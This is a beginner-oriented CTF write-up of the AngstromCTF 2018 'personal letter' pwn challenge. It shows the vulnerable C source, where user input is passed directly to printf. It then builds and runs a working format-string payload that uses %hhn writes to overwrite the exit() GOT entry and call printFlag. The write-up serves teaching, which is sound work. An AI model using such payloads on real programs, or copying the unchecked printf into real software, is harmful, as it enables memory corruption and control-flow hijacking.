# Foreword

First, I wanna say thanks to Umut Barış Öztunç and his team Break Point for their writeup to this task which you can find here: https://www.pwndiary.com/write-ups/angstrom-ctf-2018-personal-letter-write-up-pwn160/

I took the idea for the solution from here, although I tried to explain it in more details for people who, like me, have just started to play CTFs.

# personal letter

## Description

Have you ever gotten tired of writing your name in the header of a letter?
Well now there's a program (source)to do it for you! Navigate to /problems/letter/
on the shell server to try your exploit out!

hint: It prints your name right in the letter!

## Solution

Okay, let's start. First, as always I ran the binary to watch what am I working with.

<pre><font color="#EF2929"><b>root@kali</b></font>:<font color="#729FCF"><b>/mnt/hgfs/Shared</b></font># ./personal_letter32
Welcome to the personal letter program!
Give us your name, and we will generate a letter just for you!
Enter Name (100 Chars max): 
aaaaaaaaaa
________________________________________
|                                      |
|                                      |
|  Dear aaaaaaaaaa,                    |
|  __________________________________  |
|  __________________________________  |
|  __________________________________  |
|  __________________________________  |
|  __________________________________  |
|  __________________________________  |
|  __________________________________  |
|  __________________________________  |
|  __________________________________  |
|  __________________________________  |
|  __________________________________  |
|  __________________________________  |
|  __________________________________  |
|  __________________________________  |
|  __________________________________  |
|  __________________________________  |
|  __________________________________  |
|______________________________________|
Exiting.

</pre>

So, the program just takes the input and inserts it to the formated output. Also we have the source code, but we don't actually need it if we just guess to try printf vulnerability. Anyway, I'll show you this vuln in code.

```C
#include <stdio.h>
#include <stdlib.h>
#include <string.h>


void printFlag(int status){

    printf("Status Code: %d\n",status);

    char flag[50];
    FILE *flagFile;
    if ((flagFile = fopen("flag.txt","r")) == NULL) {
        printf("Error opening file.");
        return;
    }

    fscanf(flagFile, "%s", flag);
    printf("Here's a flag: %s\n", flag);

    _Exit(0);
}

void printCard(char name[]) {
    int nameLen = strlen(name);

    char *cardTop = malloc(300);
    strcpy(cardTop, "________________________________________\n");
    strcat(cardTop, "|                                      |\n");
    strcat(cardTop, "|                                      |\n");
    char *cardMid = malloc(140);
    strcpy(cardMid, "|  Dear ");
    strcat(cardMid, name);


    strcat(cardMid, ",");
    for (int i = 0; i < 30-nameLen; i++)
        strcat(cardMid, " ");
    strcat(cardMid, "|\n");
    char *cardBottom = malloc(300);
    strcpy(cardBottom, "");
    for (int i = 0; i < 17; i++)
        strcat(cardBottom, "|  __________________________________  |\n");
    strcat(cardBottom, "|______________________________________|\n");

    printf(cardTop);
    printf(cardMid);
    printf(cardBottom);

    return;
}


void main(int argc, char **argv) {

    char buf[100];
    memset(buf, 0 , 100);

    puts("Welcome to the personal letter program!");
    puts("Give us your name, and we will generate a letter just for you!");
    puts("Enter Name (100 Chars max): ");
    fgets(buf, 100, stdin);
    buf[strlen(buf)-1] = '\0';
    printCard(buf);
    puts("Exiting.\n");

    exit(0);
}
```
Here you can see that the main() function calls function printCard() and passes to it our input. In this function our input being inserted to the cardMid string, which then is passed to printf() function:

```C
...
char *cardMid = malloc(140);
strcpy(cardMid, "|  Dear ");
strcat(cardMid, name);
...
printf(cardMid);
```

So we can use string format parameters in the input.

Also, you could just type some %x to the input just to check if there is a vulnerability in the program:

<pre><font color="#EF2929"><b>root@kali</b></font>:<font color="#729FCF"><b>/mnt/hgfs/Shared</b></font># ./personal_letter32
Welcome to the personal letter program!
Give us your name, and we will generate a letter just for you!
Enter Name (100 Chars max): 
%x
________________________________________
|                                      |
|                                      |
|  Dear ff7fa2d8,                            |
|  __________________________________  |
|  __________________________________  |
|  __________________________________  |
|  __________________________________  |
|  __________________________________  |
|  __________________________________  |
|  __________________________________  |
|  __________________________________  |
|  __________________________________  |
|  __________________________________  |
|  __________________________________  |
|  __________________________________  |
|  __________________________________  |
|  __________________________________  |
|  __________________________________  |
|  __________________________________  |
|  __________________________________  |
|______________________________________|
Exiting.
</pre>

Now, what can we do with this? There is a function printFlag(), so it would be great to call it somehow. Using string format parameters we can write bytes to the memory and change the call of the function. Now it's not clear, but I'll explain it later.

First, I disassemble the program using IDA and find the function's printFlag() address:

![printFlag_address](https://raw.githubusercontent.com/0awawa0/CTF-Writeups/master/AngstromCTF%202018/Binary/personal%20letter%20(130)/src/printFlag_address.PNG)

So it is 0804872b. Next, we will find a function, which address we will rewrite. Here on the screen you can see that after printCard() function there are two more calls: puts() and exit(). We will rewrite exit() function's address. Actually you could ask, why don't we rewrite puts() address. I'll be fair, it won't work if with puts() function, and I don't know why for sure. I guess it's because of different work with stack in exit() and puts() functions.

Okay, I click the exit() function's name and I see this:

![exit_address1](https://raw.githubusercontent.com/0awawa0/CTF-Writeups/master/AngstromCTF%202018/Binary/personal%20letter%20(130)/src/exit_address1.PNG)

![exit_address2](https://raw.githubusercontent.com/0awawa0/CTF-Writeups/master/AngstromCTF%202018/Binary/personal%20letter%20(130)/src/exit_address2.PNG)

It's just redirect, double click on the offset and here we see the address (08 04 a0 30) were stores 4 bytes of exit() function's real address:

![exit_address3](https://raw.githubusercontent.com/0awawa0/CTF-Writeups/master/AngstromCTF%202018/Binary/personal%20letter%20(130)/src/exit_address3.PNG)

![exit_address4](https://raw.githubusercontent.com/0awawa0/CTF-Writeups/master/AngstromCTF%202018/Binary/personal%20letter%20(130)/src/exit_address4.PNG)

It is stored like this c8 a0 04 08, so we need to rewrite first 2 bytes to get 2b 87 04 08 and this address will be printFlag() function's address and instead of exit() function the program will call printFlag().

Now we know what we have got to do. First part of input will be like this "\x30\xa0\x04\x08\x31\xa0\x04\x08". Those are addresses in memory we will rewrite. Second part must contain more interesting data. We must write something like this "%(digit1)x%(digit2)\$hhn%(digit3)x%(digit4)\$hhn".

First we need to find digit2 and digit4. Those are indexes of digits we will write to addresses. So how will we find them? We will debug the program with stop point on the printf() function call. And then we will inspect printCard() function's frame of stack to find them.

![printfStopPoint](https://raw.githubusercontent.com/0awawa0/CTF-Writeups/master/AngstromCTF%202018/Binary/personal%20letter%20(130)/src/printfStopPoint.PNG)

![stackView](https://raw.githubusercontent.com/0awawa0/CTF-Writeups/master/AngstromCTF%202018/Binary/personal%20letter%20(130)/src/stackView.PNG)

![inputStackAddress](https://raw.githubusercontent.com/0awawa0/CTF-Writeups/master/AngstromCTF%202018/Binary/personal%20letter%20(130)/src/inputStackAddress.PNG)

Here on the screenshots we see that our input are stored at indexes 26 and 27 in the printCard() stack. Now we need to find digit1 and digit3. In the stack are stored 16 bytes: "| Dear, " - it's first 8 and our input will be 8 bytes too. So now we have 16 bytes. It's 10h, and we need 2bh, so the digit1 will be 2bh-10h=1bh=27. Next, we will need 87h, but we have 2b. digit3 will be 87h-2bh=5ch=92. Now we have our input: \x30\xa0\x04\x08\x31\xa0\x04\x08%27x%26\$hhn%92x%27\$hhn. But we can't write bytes from keyboard so I will use echo -e. Let's try it.
<pre><font color="#EF2929"><b>root@kali</b></font>:<font color="#729FCF"><b>/mnt/hgfs/Shared</b></font># echo -e &quot;\x30\xa0\x04\x08\x31\xa0\x04\x08%27x%26\$hhn%92x%27\$hhn&quot; | ./personal_letter32
Welcome to the personal letter program!
Give us your name, and we will generate a letter just for you!
Enter Name (100 Chars max): 
________________________________________
|                                      |
|                                      |
|  Dear 0�1�                   ff7fa218                                                                                          1c,|
|  __________________________________  |
|  __________________________________  |
|  __________________________________  |
|  __________________________________  |
|  __________________________________  |
|  __________________________________  |
|  __________________________________  |
|  __________________________________  |
|  __________________________________  |
|  __________________________________  |
|  __________________________________  |
|  __________________________________  |
|  __________________________________  |
|  __________________________________  |
|  __________________________________  |
|  __________________________________  |
|  __________________________________  |
|______________________________________|
Exiting.

Status Code: 0
Here&apos;s a flag: actf{flags_are_fun}
</pre>